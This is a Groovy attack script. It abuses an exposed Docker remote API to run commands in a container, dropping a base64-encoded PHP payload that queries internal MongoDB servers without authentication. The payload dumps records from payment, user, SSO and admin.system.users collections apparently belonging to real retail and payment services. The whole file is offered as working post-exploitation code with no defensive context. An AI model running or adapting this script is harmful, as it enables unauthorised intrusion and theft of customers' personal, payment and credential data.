import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
// Try direct find on known collections without auth
$m=new MongoDB\\Driver\\Manager("mongodb://172.26.84.132:27020,172.26.84.132:27021/?readPreference=secondaryPreferred");

$tests = [
    ["credito-claroshop","purchase_charge"],
    ["singlepages","eshoppaymethods"],
    ["singlepages","users"],
    ["sso","User"],
    ["t1pagos","transaction"],
    ["users-t1pay","user"],
    ["credito-claroshop","purchase_charge"],
    ["admin","system.users"],
];

foreach($tests as $t){
    $db=$t[0];$col=$t[1];
    echo "=== $db.$col ===\n";
    try {
        $q=new MongoDB\\Driver\\Query([],["limit"=>3]);
        $r=$m->executeQuery("$db.$col",$q);
        $r->setTypeMap(["root"=>"array","array"=>"array","document"=>"array"]);
        $docs=iterator_to_array($r);
        echo "  docs: ".count($docs)."\n";
        foreach($docs as $d){
            echo "  ".json_encode($d,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES)."\n";
        }
    } catch(Exception $e) {
        echo "  ERR: ".$e->getMessage()."\n";
    }
}
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(60000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/mfind.php && php /tmp/mfind.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(60000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
